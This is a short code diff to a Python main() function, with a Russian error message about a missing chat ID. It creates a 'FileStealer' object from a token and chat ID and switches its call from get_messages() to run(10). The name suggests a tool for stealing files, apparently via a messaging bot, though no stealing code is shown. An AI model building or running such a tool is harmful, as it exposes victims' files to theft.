@@ -19,7 +19,7 @@ def main():
         raise ValueError('Отсутствует ID чата в переменных окружения')
 
     file_stealer = FileStealer(token, chat_id)
-    file_stealer.get_messages()
+    file_stealer.run(10)
 
 
 if __name__ == '__main__':
